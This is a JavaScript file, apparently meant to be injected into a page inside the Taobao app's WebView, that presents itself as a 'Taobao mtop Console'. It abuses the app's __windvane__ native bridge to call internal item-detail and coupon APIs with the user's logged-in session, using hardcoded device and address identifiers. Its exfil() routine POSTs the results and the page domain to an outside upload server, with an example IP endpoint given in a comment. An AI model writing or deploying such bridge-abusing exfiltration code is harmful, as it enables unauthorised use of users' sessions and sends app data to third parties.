(function () {
  'use strict';

  var W = window;
  var D = document;

  /* ================= 外传配置（从页面 URL query 读，不硬编码） ================= */
  function getQuery(name) {
    var m = location.search.match(new RegExp('[?&]' + name + '=([^&]*)'));
    return m ? decodeURIComponent(m[1]) : '';
  }
  var SVR = getQuery('svr');        // 外传服务器，如 http://81.70.82.70:6731/upload
  var TK = getQuery('token');       // 上传 token
  var CAN_EXFIL = !!(SVR && TK);

  /* ================= eruda ================= */
  function loadEruda(cb) {
    if (W.eruda) { try { W.eruda.init(); } catch (e) {} if (cb) cb(W.eruda); return; }
    var s = D.createElement('script');
    s.src = 'https://cdn.jsdelivr.net/npm/eruda@2.4.1/eruda.min.js';
    s.onload = function () {
      if (W.eruda) { try { W.eruda.init(); } catch (e) {} }
      if (cb) cb(W.eruda);
    };
    s.onerror = function () {
      import('https://cdn.jsdelivr.net/npm/eruda@2.4.1/+esm').then(function (m) {
        var er = (m && m.default) || W.eruda;
        if (er && er.init) er.init();
        if (cb) cb(er);
      }).catch(function () { if (cb) cb(null); });
    };
    D.head.appendChild(s);
  }

  /* ================= mtop 封装 ================= */
  function mtopSend(api, param, version) {
    return new Promise(function (resolve, reject) {
      if (!W.__windvane__ || !W.__windvane__.call) { reject('no __windvane__ bridge'); return; }
      var p = {
        api: api,
        v: version || '1.0',
        post: '1',
        type: '',
        isHttps: '0',
        ecode: '0',
        isSec: '0',
        param: param,
        timer: 30000,
        needLogin: true,
        sessionOption: 'AutoLoginOnly',
        ext_headers: {},
        ext_querys: {}
      };
      W.__windvane__.call('MtopWVPlugin.send', p, resolve, reject, 10000);
    });
  }

  /* ================= 商品详情 ================= */
  function buildDetailParam(itemId) {
    var ex = {
      NAV_PROCESSOR_START_TIME: "1761720138804",
      appReqFrom: "detail",
      bizName: "minidetail",
      container_type: "sku",
      countryCode: "CN",
      cpuCore: "8",
      cpuMaxHz: "null",
      deviceLevel: "medium",
      dinamic_v3: "true",
      dynamicJsonData: "true",
      finalUltron: "true",
      from: "minidetail",
      identifier: "",
      industryMainPicDegrade: "false",
      isFoldDevice: "false",
      isPadDevice: "false",
      isPrefetchSkuMtop: "false",
      itemId: itemId,
      item_id: itemId,
      latitude: "0",
      liveAutoPlay: "true",
      longitude: "0",
      newStruct: "true",
      nick: "",
      openFrom: "tbmessage",
      osVersion: "34",
      phoneType: "OPPO11",
      preload_v: "industry",
      screenHeight: "2606",
      screenWidth: "1240",
      skuId: "null",
      skuOutSdk: "true",
      skuType: "confirm",
      sku_forbidH5: "true",
      sku_forbidH5_toast: "该商品不支持聊天窗内选择规格",
      soVersion: "2.0",
      sourceType: "3",
      "spm-cnt": "a2141.1007.41750.336411",
      supportIndustryMainPic: "true",
      transparent_key: "openFrom,itemId,identifier,bizName,sourceType,sku_forbidH5,sku_forbidH5_toast,from,skuId",
      ttd_ttid: "10001201@tt_detail_android_12.51.40",
      ultron2: "true",
      utdid: "b5eAIejvgwsCAbRmgzU4VyYm",
      videoAutoPlay: "true"
    };
    return { detail_v: "3.3.2", exParams: JSON.stringify(ex), id: itemId };
  }

  function getDetail(itemId) {
    return mtopSend('mtop.taobao.detail.data.get', buildDetailParam(itemId), '1.0');
  }

  /* ================= 优惠券 ================= */
  function buildCouponParam(itemId) {
    var ex = {
      wh_weex: "true",
      "": "",
      subItemId: itemId,
      itemId: itemId,
      popId: "1755758950744",
      sellerId: "",
      marketcoupon: "true",
      from: "cart",
      sellerType: "B",
      weex_mode: "dom",
      addressId: "23516134638",
      token: "-1632109989",
      renderMode: "texture",
      promotionFloatingData: "undefined"
    };
    return { exParam: JSON.stringify(ex), itemId: itemId };
  }

  function getCoupon(itemId) {
    return mtopSend('mtop.taobao.detail.taodetail.getcoupon', buildCouponParam(itemId), '1.0');
  }

  /* ================= 外传 ================= */
  function exfil(itemId, detail, coupon) {
    if (!CAN_EXFIL) {
      return '[外传跳过] 未提供 svr / token 参数';
    }
    var payload = {
      domain: D.domain,
      itemId: itemId,
      detail: detail,
      coupon: coupon,
      timestamp: new Date().toISOString()
    };
    var json = JSON.stringify(payload);
    var x = new XMLHttpRequest();
    x.open('POST', SVR, true);
    x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    x.onreadystatechange = function () {
      if (x.readyState == 4) { return; }
    };
    x.send('token=' + encodeURIComponent(TK) + '&data=' + encodeURIComponent(json));
    return '已发送 JSON ' + json.length + ' 字节';
  }

  /* ================= UI ================= */
  function renderUI() {
    D.body.innerHTML =
      "<div style='position:fixed;inset:0;background:#fff;overflow:auto;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif;padding:16px;box-sizing:border-box;'>" +
        "<h1 style='font-size:18px;margin:0 0 12px;color:#e94560;'>Taobao mtop Console</h1>" +
        "<div style='display:flex;gap:8px;margin-bottom:12px;'>" +
          "<input id='itemId' type='text' value='1027602885349' placeholder='输入商品ID' " +
            "style='flex:1;height:44px;padding:0 12px;font-size:15px;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;' />" +
          "<button id='run' style='height:44px;padding:0 20px;font-size:15px;color:#fff;background:#0f766e;border:none;border-radius:6px;'>获取详情+优惠券</button>" +
        "</div>" +
        "<div id='status' style='font-size:13px;color:#666;margin-bottom:12px;'>就绪 · eruda 加载中...</div>" +
        "<div style='margin-bottom:12px;'><b style='font-size:14px;'>商品详情</b>" +
          "<pre id='detail' style='white-space:pre-wrap;word-break:break-all;font-size:11px;background:#f6f7f9;border:1px solid #eee;border-radius:6px;padding:10px;max-height:40vh;overflow:auto;margin:6px 0 0;'>等待请求...</pre></div>" +
        "<div><b style='font-size:14px;'>优惠券</b>" +
          "<pre id='coupon' style='white-space:pre-wrap;word-break:break-all;font-size:11px;background:#f6f7f9;border:1px solid #eee;border-radius:6px;padding:10px;max-height:40vh;overflow:auto;margin:6px 0 0;'>等待请求...</pre></div>" +
      "</div>";

    var input = D.getElementById('itemId');
    var run = D.getElementById('run');
    var status = D.getElementById('status');
    var detailEl = D.getElementById('detail');
    var couponEl = D.getElementById('coupon');

    function setStatus(t) { status.textContent = t; }

    run.addEventListener('click', function () {
      var id = (input.value || '').trim();
      if (!id) { setStatus('请输入商品ID'); return; }
      setStatus('请求中...');
      detailEl.textContent = '请求中...';
      couponEl.textContent = '请求中...';

      var detailDone = false, couponDone = false;
      var detailData = null, couponData = null;

      function tryExfil() {
        if (detailDone && couponDone) {
          var msg = exfil(id, detailData, couponData);
          setStatus('详情 + 优惠券 OK · ' + msg);
        }
      }

      getDetail(id).then(function (r) {
        detailData = r;
        detailDone = true;
        detailEl.textContent = JSON.stringify(r, null, 1);
        tryExfil();
      }).catch(function (e) {
        detailData = { error: e };
        detailDone = true;
        detailEl.textContent = '[FAIL] ' + JSON.stringify(e);
        tryExfil();
      });

      getCoupon(id).then(function (r) {
        couponData = r;
        couponDone = true;
        couponEl.textContent = JSON.stringify(r, null, 1);
        tryExfil();
      }).catch(function (e) {
        couponData = { error: e };
        couponDone = true;
        couponEl.textContent = '[FAIL] ' + JSON.stringify(e);
        tryExfil();
      });
    });
  }

  /* ================= init ================= */
  renderUI();
  loadEruda(function (er) {
    var st = D.getElementById('status');
    if (st) st.textContent = (er ? '就绪 · eruda 已加载' : '就绪 · eruda 加载失败') + ' · 外传' + (CAN_EXFIL ? '已配置' : '未配置(svr/token)');
  });
})();
